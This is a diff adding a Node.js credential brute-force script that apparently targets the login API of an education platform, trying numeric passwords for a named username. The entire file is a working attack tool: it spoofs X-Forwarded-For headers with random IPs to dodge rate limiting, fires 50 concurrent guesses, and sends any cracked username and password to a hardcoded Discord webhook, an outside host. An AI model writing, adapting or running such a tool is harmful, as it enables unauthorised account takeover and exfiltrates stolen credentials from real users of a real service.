@@ -1,0 +1,198 @@
+const axios = require('axios');
+const fs = require('fs');
+const crypto = require('crypto');
+
+let triedPasswords = new Set();
+let isRunning = true;
+let interval;
+console.clear();
+const apiURL = "https://pearlsapi.learnovia.com/api/auth/login";
+const webhook = "https://discord.com/api/webhooks/1290310046978150400/6NKG40Uxa6Njv2bJxxdD6vJHQ4_5IpFnVrGzatUmU-pjgpn7wIk7-xpclcvWh4JXVr1M";
+const headers = {
+    "accept": "application/json",
+    "authorization": "Bearer null",
+    "content-type": "application/json",
+    "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Opera GX\";v=\"113\", \"Chromium\";v=\"127\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "X-Forwarded-For": generateRandomIP()
+};
+
+// Define your inputs here
+const username = 'pls1728';  // Replace with the target username
+const startRange = 976400;            // Replace with the start of the password range
+const endRange = 976499;             // Replace with the end of the password range
+const useLogFile = false;             // Set to true if you want to use a log file, false otherwise
+const logFilePath = 'password_log.txt'; // Replace with the path to the log file
+
+// Colors for terminal
+const PURPLE = "\x1b[35m";
+const RED = "\x1b[31m";
+const GREEN = "\x1b[32m";
+const RESET = "\x1b[0m";
+
+function generateRandomIP() {
+    const randomSegment = () => Math.floor(Math.random() * 256);
+    return `${randomSegment()}.${randomSegment()}.${randomSegment()}.${randomSegment()}`;
+}
+
+async function sendWebhook(content, embed = null) {
+    const payload = {
+        content: content,
+        embeds: embed ? [embed] : []
+    };
+    try {
+        await axios.post(webhook, payload, {
+            headers: { 'Content-Type': 'application/json' }
+        });
+    } catch (error) {
+        console.error(`${RED}Error: Unable to send webhook.${RESET}`);
+    }
+}
+
+function generateRandomString(length) {
+    return crypto.randomBytes(length).toString('hex');
+}
+
+function loadTriedPasswordsFromFile(filePath) {
+    if (fs.existsSync(filePath)) {
+        const fileContent = fs.readFileSync(filePath, 'utf-8');
+        const passwordList = fileContent.split('\n').filter(Boolean).map(password => password.trim());
+        passwordList.forEach(password => triedPasswords.add(password));
+        console.log(`${GREEN}[+] Loaded ${passwordList.length} passwords from the log file.${RESET}`);
+    } else {
+        console.log(`${RED}[-] Log file does not exist. Starting fresh.${RESET}`);
+    }
+}
+
+function savePasswordToLog(filePath, password) {
+    fs.appendFileSync(filePath, `${password}\n`);
+}
+
+async function tryPassword(username, password, headers, logFile, startTime) {
+    if (!isRunning) {
+        process.exit();
+    }
+    try {
+        const response = await axios.post(apiURL, {
+            username: username,
+            password: password,
+            remember: true,
+            fcm_tokens: [null]
+        }, { headers: { ...headers, "X-Forwarded-For": generateRandomIP() } });
+        if (response.data.message === "logged in successfully") {
+            console.log(`${GREEN}[+] Password found: ${password}${RESET}`);
+            const endTime = new Date();
+            displayElapsedTime(startTime, endTime);
+            const elapsedTimeMs = endTime - startTime;
+            const seconds = Math.floor((elapsedTimeMs / 1000) % 60);
+            const minutes = Math.floor((elapsedTimeMs / (1000 * 60)) % 60);
+            const hours = Math.floor((elapsedTimeMs / (1000 * 60 * 60)) % 24);
+
+            let timeMessage = '';
+            if (hours > 0) {
+                timeMessage = `${hours} hour(s), ${minutes} minute(s), ${seconds} second(s)`;
+            } else if (minutes > 0) {
+                timeMessage = `${minutes} minute(s), ${seconds} second(s)`;
+            } else {
+                timeMessage = `${seconds} second(s)`;
+            }
+
+            const embed = {
+                title: "Successfully Cracked Password",
+                description: `**Username:** ${username}\n**Password:** ${password}`,
+                color: 10181046,
+                footer: { text: `Time taken: ${timeMessage}` }
+            };
+            await sendWebhook(null, embed);
+            isRunning = false;
+            clearInterval(interval);
+            process.exit();
+        } else {
+            savePasswordToLog(logFile, password);
+        }
+    } catch (error) {
+        if (error.response) {
+            const statusCode = error.response.status;
+            if (error.response.data.message === "Invalid username or password") {
+                console.log(`${RED}[-] Password: ${password} failed${RESET}`);
+                savePasswordToLog(logFile, password);
+            } else if (statusCode === 429) {
+                const retryAfter = error.response.headers['retry-after'];
+                const retryDelay = retryAfter ? parseInt(retryAfter, 10) * 1000 : 60000;
+                console.log(`${PURPLE}[i] Ratelimited. Delaying for ${retryAfter || 60} seconds.${RESET}`);
+                await new Promise(resolve => setTimeout(resolve, retryDelay));
+            } else {
+                console.log(`${RED}Error trying password: ${password}, error code: ${statusCode}${RESET}`);
+            }
+        } else {
+            console.error(`${RED}Error: Unable to complete request. Please check your connection or the server.${RESET}`);
+        }
+    }
+}
+
+function getRandomPassword(startRange, endRange) {
+    let password;
+    const passwordLength = endRange.toString().length;
+    do {
+        password = Math.floor(Math.random() * (endRange - startRange + 1)) + startRange;
+    } while (triedPasswords.has(password.toString().padStart(passwordLength, '0')));
+    triedPasswords.add(password.toString().padStart(passwordLength, '0'));
+    return password.toString().padStart(passwordLength, '0');
+}
+
+async function bruteForce(username, startRange, endRange, logFile) {
+    const passwordPromises = [];
+    const startTime = new Date();
+    await sendWebhook(`Started At: ${startTime.toLocaleTimeString()}`);
+    interval = setInterval(async () => {
+        if (isRunning) {
+            await sendWebhook(":white_check_mark:");
+        }
+    }, 600000);
+
+    while (isRunning && triedPasswords.size < (endRange - startRange + 1)) {
+        const password = getRandomPassword(startRange, endRange);
+        passwordPromises.push(tryPassword(username, password, headers, logFile, startTime));
+
+        if (passwordPromises.length >= 50) {
+            await Promise.all(passwordPromises);
+            passwordPromises.length = 0;
+        }
+    }
+
+    await Promise.all(passwordPromises);
+    if (isRunning) {
+        console.log(`${RED}All possible passwords in range tried.${RESET}`);
+        await sendWebhook("All ids searched no match found");
+        clearInterval(interval);
+        const endTime = new Date();
+        displayElapsedTime(startTime, endTime);
+    }
+}
+
+function displayElapsedTime(startTime, endTime) {
+    const elapsedTimeMs = endTime - startTime;
+    const seconds = Math.floor((elapsedTimeMs / 1000) % 60);
+    const minutes = Math.floor((elapsedTimeMs / (1000 * 60)) % 60);
+    const hours = Math.floor((elapsedTimeMs / (1000 * 60 * 60)) % 24);
+
+    let timeMessage = '';
+    if (hours > 0) {
+        timeMessage = `${hours} hour(s), ${minutes} minute(s), ${seconds} second(s)`;
+    } else if (minutes > 0) {
+        timeMessage = `${minutes} minute(s), ${seconds} second(s)`;
+    } else {
+        timeMessage = `${seconds} second(s)`;
+    }
+
+    console.log(`${GREEN}[i] Time it took to crack: ${timeMessage}${RESET}`);
+}
+
+// Load passwords from log file if required
+if (useLogFile) {
+    loadTriedPasswordsFromFile(logFilePath);
+}
+
+// Start the brute force attack
+bruteForce(username, startRange, endRange, logFilePath);
